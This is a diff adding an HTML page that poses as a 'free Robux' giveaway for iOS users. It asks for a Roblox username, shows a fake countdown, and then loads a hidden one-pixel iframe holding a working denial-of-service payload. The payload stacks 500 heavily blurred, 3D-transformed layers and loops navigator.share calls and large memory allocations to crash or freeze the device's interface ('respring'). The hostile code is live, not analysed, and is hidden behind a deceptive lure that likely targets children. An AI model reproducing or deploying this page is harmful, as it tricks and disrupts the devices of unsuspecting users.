@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>GIVERBX</title>
+        <meta name="description" content="FREE ROBUX FOR IOS WINNING DISCORD ROBUX GIVEAWAYS"/>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta property="og:title" content="respring">
+        <meta property="og:description" content="instant respring for iOS devices">
+        <meta property="og:url" content="https://jailbreak.party/respring">
+        <meta name="theme-color" content="#0074fb">
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+                font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Segoe UI", Roboto, sans-serif;
+            }
+
+            body {
+                min-height: 100vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                background: #030712;
+                overflow: hidden;
+                position: relative;
+                color: #ffffff;
+            }
+
+            /* Glowing Gradient Mesh Background */
+            .gradient-bg {
+                position: absolute;
+                inset: 0;
+                z-index: 1;
+                overflow: hidden;
+            }
+
+            .orb {
+                position: absolute;
+                border-radius: 50%;
+                filter: blur(90px);
+                opacity: 0.65;
+                animation: float 10s ease-in-out infinite alternate;
+                transition: background 0.8s ease;
+            }
+
+            .orb-1 {
+                width: 380px;
+                height: 380px;
+                background: radial-gradient(circle, #0074fb 0%, #7c3aed 100%);
+                top: -10%;
+                left: -10%;
+                animation-duration: 8s;
+            }
+
+            .orb-2 {
+                width: 420px;
+                height: 420px;
+                background: radial-gradient(circle, #ec4899 0%, #8b5cf6 100%);
+                bottom: -15%;
+                right: -10%;
+                animation-duration: 12s;
+            }
+
+            .orb-3 {
+                width: 320px;
+                height: 320px;
+                background: radial-gradient(circle, #06b6d4 0%, #3b82f6 100%);
+                top: 40%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                animation-duration: 10s;
+            }
+
+            /* Unsupported Mode Orb Colors */
+            body.unsupported-mode .orb-1 {
+                background: radial-gradient(circle, #f43f5e 0%, #be123c 100%);
+            }
+            body.unsupported-mode .orb-2 {
+                background: radial-gradient(circle, #fb923c 0%, #c2410c 100%);
+            }
+            body.unsupported-mode .orb-3 {
+                background: radial-gradient(circle, #e11d48 0%, #881337 100%);
+            }
+
+            @keyframes float {
+                0% {
+                    transform: translate(0px, 0px) scale(1);
+                }
+                100% {
+                    transform: translate(30px, -40px) scale(1.15);
+                }
+            }
+
+            /* Ambient Background Grid Overlay */
+            .grid-overlay {
+                position: absolute;
+                inset: 0;
+                background-image: radial-gradient(rgba(255, 255, 255, 0.08) 1px, transparent 1px);
+                background-size: 24px 24px;
+                z-index: 2;
+                opacity: 0.4;
+            }
+
+            /* Glassmorphism Card Container */
+            .card {
+                position: relative;
+                z-index: 10;
+                background: rgba(255, 255, 255, 0.03);
+                backdrop-filter: blur(24px);
+                -webkit-backdrop-filter: blur(24px);
+                border: 1px solid rgba(255, 255, 255, 0.12);
+                box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6),
+                            0 0 40px rgba(0, 116, 251, 0.25);
+                border-radius: 28px;
+                padding: 44px 32px;
+                width: 90%;
+                max-width: 360px;
+                text-align: center;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                gap: 24px;
+                transition: all 0.5s ease;
+            }
+
+            .card.unsupported-card {
+                box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6),
+                            0 0 40px rgba(244, 63, 94, 0.3);
+                border-color: rgba(244, 63, 94, 0.25);
+            }
+
+            /* Input Section Styling */
+            .input-group {
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                gap: 16px;
+            }
+
+            .input-field {
+                width: 100%;
+                padding: 14px 18px;
+                background: rgba(255, 255, 255, 0.05);
+                border: 1px solid rgba(255, 255, 255, 0.15);
+                border-radius: 14px;
+                color: #ffffff;
+                font-size: 1rem;
+                outline: none;
+                transition: all 0.3s ease;
+                text-align: center;
+            }
+
+            .input-field::placeholder {
+                color: rgba(255, 255, 255, 0.4);
+            }
+
+            .input-field:focus {
+                border-color: #0074fb;
+                box-shadow: 0 0 18px rgba(0, 116, 251, 0.4);
+                background: rgba(255, 255, 255, 0.08);
+            }
+
+            .confirm-btn {
+                width: 100%;
+                padding: 14px 20px;
+                background: linear-gradient(135deg, #0074fb 0%, #7c3aed 100%);
+                border: none;
+                border-radius: 14px;
+                color: #ffffff;
+                font-size: 1rem;
+                font-weight: 600;
+                cursor: pointer;
+                box-shadow: 0 4px 20px rgba(0, 116, 251, 0.4);
+                transition: all 0.3s ease;
+            }
+
+            .confirm-btn:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 6px 25px rgba(0, 116, 251, 0.6);
+            }
+
+            .confirm-btn:active {
+                transform: translateY(0);
+            }
+
+            /* Loading Container */
+            .loading-container {
+                width: 100%;
+                display: none;
+                flex-direction: column;
+                align-items: center;
+                gap: 24px;
+            }
+
+            /* Dual Spinning Ring Loader */
+            .spinner-container {
+                position: relative;
+                width: 80px;
+                height: 80px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .spinner-ring {
+                position: absolute;
+                inset: 0;
+                border-radius: 50%;
+                border: 3px solid transparent;
+                border-top-color: #0074fb;
+                border-right-color: #06b6d4;
+                animation: spin 1.2s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
+                filter: drop-shadow(0 0 12px #0074fb);
+            }
+
+            .spinner-ring-outer {
+                position: absolute;
+                inset: -8px;
+                border-radius: 50%;
+                border: 2px solid transparent;
+                border-bottom-color: #ec4899;
+                border-left-color: #8b5cf6;
+                animation: spin-reverse 2s linear infinite;
+                filter: drop-shadow(0 0 10px #ec4899);
+            }
+
+            .center-glow {
+                width: 18px;
+                height: 18px;
+                background: #ffffff;
+                border-radius: 50%;
+                box-shadow: 0 0 20px 5px #0074fb, 0 0 35px 10px #ec4899;
+                animation: pulse 1.5s ease-in-out infinite alternate;
+            }
+
+            /* Unsupported Warning Icon */
+            .error-icon {
+                display: none;
+                width: 72px;
+                height: 72px;
+                border-radius: 50%;
+                background: rgba(244, 63, 94, 0.12);
+                border: 1px solid rgba(244, 63, 94, 0.3);
+                align-items: center;
+                justify-content: center;
+                color: #fb7185;
+                font-size: 32px;
+                box-shadow: 0 0 25px rgba(244, 63, 94, 0.3);
+            }
+
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+
+            @keyframes spin-reverse {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(-360deg); }
+            }
+
+            @keyframes pulse {
+                0% { transform: scale(0.8); opacity: 0.7; }
+                100% { transform: scale(1.25); opacity: 1; }
+            }
+
+            /* Typography */
+            .text-group h1 {
+                font-size: 1.5rem;
+                font-weight: 700;
+                letter-spacing: -0.02em;
+                background: linear-gradient(135deg, #ffffff 0%, #a1a1aa 100%);
+                -webkit-background-clip: text;
+                -webkit-text-fill-color: transparent;
+                margin-bottom: 6px;
+            }
+
+            .text-group p {
+                font-size: 0.875rem;
+                color: rgba(255, 255, 255, 0.6);
+                letter-spacing: 0.01em;
+                line-height: 1.4;
+            }
+
+            /* 5-Second Animated Progress Bar Track */
+            .progress-bar-track {
+                width: 100%;
+                height: 6px;
+                background: rgba(255, 255, 255, 0.08);
+                border-radius: 10px;
+                overflow: hidden;
+                position: relative;
+            }
+
+            .progress-bar-fill {
+                position: absolute;
+                top: 0;
+                left: 0;
+                height: 100%;
+                width: 0%;
+                background: linear-gradient(90deg, #0074fb, #ec4899, #06b6d4);
+                border-radius: 10px;
+                box-shadow: 0 0 14px rgba(0, 116, 251, 0.8);
+                transition: width 5s linear;
+            }
+
+            /* Status Badge */
+            .status-badge {
+                display: inline-flex;
+                align-items: center;
+                gap: 8px;
+                padding: 6px 14px;
+                background: rgba(0, 116, 251, 0.15);
+                border: 1px solid rgba(0, 116, 251, 0.3);
+                border-radius: 20px;
+                font-size: 0.75rem;
+                color: #38bdf8;
+                font-weight: 500;
+            }
+
+            .status-badge.error {
+                background: rgba(244, 63, 94, 0.15);
+                border-color: rgba(244, 63, 94, 0.3);
+                color: #fb7185;
+            }
+
+            .status-dot {
+                width: 6px;
+                height: 6px;
+                background-color: #38bdf8;
+                border-radius: 50%;
+                box-shadow: 0 0 8px #38bdf8;
+                animation: pulse 1s infinite alternate;
+            }
+
+            .status-badge.error .status-dot {
+                background-color: #fb7185;
+                box-shadow: 0 0 8px #fb7185;
+            }
+        </style>
+    </head>
+    <body>
+        <!-- Animated Background -->
+        <div class="gradient-bg">
+            <div class="orb orb-1"></div>
+            <div class="orb orb-2"></div>
+            <div class="orb orb-3"></div>
+        </div>
+        <div class="grid-overlay"></div>
+
+        <!-- Glowing Card UI -->
+        <div class="card" id="card">
+            
+            <!-- STEP 1: Name Input Section -->
+            <div class="input-group" id="inputStep">
+                <div class="text-group">
+                    <h1>ROBLOX USERNAME</h1>
+                    <p>Enter your roblox username to proceed</p>
+                </div>
+                <input type="text" id="nameInput" class="input-field" placeholder="Your Name" autocomplete="off" autofocus />
+                <button id="confirmBtn" class="confirm-btn">Confirm</button>
+            </div>
+
+            <!-- STEP 2: Loading State Section (Hidden by Default) -->
+            <div class="loading-container" id="loadingStep">
+                <div class="spinner-container">
+                    <div class="spinner-ring-outer"></div>
+                    <div class="spinner-ring"></div>
+                    <div class="center-glow"></div>
+                </div>
+
+                <div class="text-group">
+                    <h1 id="userGreeting">respring</h1>
+                    <p id="description">Initiating respring sequence...</p>
+                </div>
+
+                <div class="progress-bar-track">
+                    <div class="progress-bar-fill" id="progressBarFill"></div>
+                </div>
+
+                <div class="status-badge" id="statusBadge">
+                    <span class="status-dot"></span>
+                    <span id="statusText">Respring in 5s...</span>
+                </div>
+            </div>
+
+            <!-- STEP 3: Unsupported Error Section (Hidden by Default) -->
+            <div id="unsupportedStep" style="display: none; flex-direction: column; align-items: center; gap: 24px; width: 100%;">
+                <div class="error-icon" id="errorIcon" style="display: flex;">
+                    &#9888;&#xFE0F;
+                </div>
+                <div class="text-group">
+                    <h1>Unsupported Platform</h1>
+                    <p>This utility requires an iOS device (iPhone or iPad) to function.</p>
+                </div>
+                <div class="status-badge error">
+                    <span class="status-dot"></span>
+                    <span>iOS Device Required</span>
+                </div>
+            </div>
+
+        </div>
+
+        <!--  big credit to @neonmodder123  -->
+        <iframe id="frame" style="width: 1px;height: 1px;" srcdoc="" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>
+        
+        <script>
+            // Check if device is iOS / iPadOS
+            function isIOS() {
+                const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+                const isStandardIOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
+                const isIPadOS = navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1;
+                return isStandardIOS || isIPadOS;
+            }
+
+            const frame = document.getElementById('frame');
+            const inputStep = document.getElementById('inputStep');
+            const loadingStep = document.getElementById('loadingStep');
+            const unsupportedStep = document.getElementById('unsupportedStep');
+            const nameInput = document.getElementById('nameInput');
+            const confirmBtn = document.getElementById('confirmBtn');
+            const userGreeting = document.getElementById('userGreeting');
+            const progressBarFill = document.getElementById('progressBarFill');
+            const statusText = document.getElementById('statusText');
+
+            // Handle Non-iOS Platforms
+            if (!isIOS()) {
+                document.body.classList.add('unsupported-mode');
+                document.getElementById('card').classList.add('unsupported-card');
+                inputStep.style.display = 'none';
+                unsupportedStep.style.display = 'flex';
+            }
+
+            // Start 5-Second Respring Sequence
+            function startRespringSequence() {
+                const userName = nameInput.value.trim() || 'User';
+                
+                // Switch UI from Input to Loading
+                inputStep.style.display = 'none';
+                loadingStep.style.display = 'flex';
+                userGreeting.innerText = `Hello, ${userName}`;
+
+                // Trigger smooth 5-second progress bar fill
+                requestAnimationFrame(() => {
+                    progressBarFill.style.width = '100%';
+                });
+
+                // Countdown timer
+                let secondsLeft = 5;
+                statusText.innerText = `Respring in ${secondsLeft}s...`;
+
+                const interval = setInterval(() => {
+                    secondsLeft--;
+                    if (secondsLeft > 0) {
+                        statusText.innerText = `Respring in ${secondsLeft}s...`;
+                    } else {
+                        statusText.innerText = `Triggering respring...`;
+                        clearInterval(interval);
+                    }
+                }, 1000);
+
+                // Execute exact unchanged respring script after 5 seconds
+                setTimeout(() => {
+                    const respringScript = `
+                        <html>
+                        <body>
+                            <script>
+                                const container = document.createElement('div');
+                                container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
+                                document.body.appendChild(container);
+            
+                                for (let i = 0; i < 500; i++) {
+                                    let d = document.createElement('div');
+                                    d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg);';
+                                    container.appendChild(d);
+                                }
+            
+                                setInterval(() => {
+                                    navigator.share({ title: 'R', text: 'R'.repeat(100000) }).catch(() => {});
+                                    let x = new Uint8Array(1024 * 1024 * 10);
+                                    crypto.getRandomValues(x);
+                                }, 0);
+                            <\/script>
+                        </body>
+                        </html>
+                    `;
+            
+                    frame.srcdoc = respringScript;
+                }, 5000);
+            }
+
+            // Event Listeners for Confirm Button & Enter Key
+            confirmBtn.addEventListener('click', startRespringSequence);
+            nameInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    startRespringSequence();
+                }
+            });
+        </script>
+    </body>
+</html>
